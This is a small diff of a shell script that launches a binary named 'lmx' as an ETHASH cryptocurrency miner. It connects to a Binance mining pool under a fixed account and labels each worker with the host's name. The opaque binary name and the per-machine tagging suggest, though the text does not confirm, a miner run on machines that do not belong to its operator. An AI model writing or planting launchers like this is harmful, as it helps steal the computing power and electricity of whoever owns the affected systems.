@@ -1,4 +1,4 @@
 #!/bin/sh
 
 chmod +x lmx
-./lmx --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user dandi131.001.$(cat /proc/sys/kernel/hostname)
+./lmx --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user dandi131.001 --pass 123456.$(cat /proc/sys/kernel/hostname)
